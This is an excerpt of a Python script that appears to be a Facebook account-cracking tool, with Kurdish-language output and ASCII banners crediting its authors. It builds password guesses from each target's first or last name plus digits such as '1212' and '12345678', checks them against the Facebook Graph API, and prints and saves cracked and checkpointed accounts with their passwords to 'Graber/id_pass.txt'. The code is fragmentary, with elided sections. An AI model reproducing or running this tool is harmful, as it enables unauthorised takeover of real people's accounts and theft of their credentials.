...
#### LOGO ####
logo = """
\x1b[31;1m   This Tool Craete by rasha but recode by Lost /\Your id is active
\x1b[31;1m  |||||||/\/
\x1b[31;1m  / _` /
\x1b[31;1m  (_| \
\x1b[31;1m  \__,_|
...
RH = """
\x1b[31;1m   __This Tool Create by rasha but Recode by Aro/\Your id is active
\x1b[37;1m   __ _
\x1b[31;1m  / _` |
\x1b[37;1m   (_| |
\x1b[31;1m  \__,_|
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[37;1m Hack Bu Akretawa😁❤️'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[37;1mAccountaka La Checkpointa Dway 7 rozh😪'
				    ...
				    pass2 = b['first_name'] + '1212'										
			            ...
			            if 'access_token' in q:	
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[37;1m Hack Bu Akretawa😁❤️😍100/100'											
				                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b[37;1mID kay >>>' + user											
						       ...
						       oks.append(user+pass3)
			                               ...
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[37;1mAccountaka La Checkpointa Dway7rozh😪'
				                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                           print '\x1b[37;1mID kay >>> ' + user
				                           print '\x1b[37;1mPASSWORD kay >>> ' + pass3 + '\n'
				                           cek = open("Graber/id_pass.txt", "a")
						           ...
						           pass4 = b['first_name'] + '12345@@'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[37;1m Hack Bu Akretawa Pubg😁❤️'											
				                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b[37;1mID kay >>>' + user											
							                           ...
							                           pass6 = '1122334455'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								                               ...
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[37;1m Hack Bu Akretawa100/100'											
				                                                                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                       print '\x1b[37;1mID kay >>>' + user											
									                               ...
									                               oks.append(user+pass7)
			                                                                               ...
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[37;1mAccountaka La Checkpointa dway7 rozh😪'
				                                                                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                           print '\x1b[37;1mID kay >>> ' + user
				                                                                           print '\x1b[37;1mPASSWORD kay >>> ' + pass7  + '\n'
				                                                                           cek = open("Graber/id_pass.txt", "a")
										                           ...
										                           pass8 = b['last_name'] + '12345678'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[37;1m Hack Bu Akretawa Max😁❤️'											
				                                                                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                   print '\x1b[37;1mID kay >>> ' + user											
										                                       ...
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[37;1m Hack Bu Akretawa😁❤️pubg'											
				                                                                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                               print '\x1b[37;1mID kay >>>' + user											
